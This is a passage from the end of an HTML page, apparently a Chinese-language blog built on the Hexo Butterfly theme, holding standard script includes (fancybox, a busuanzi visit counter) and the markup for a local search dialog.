src="/js/main.js?v=4.13.0"></script><script src="/js/tw_cn.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
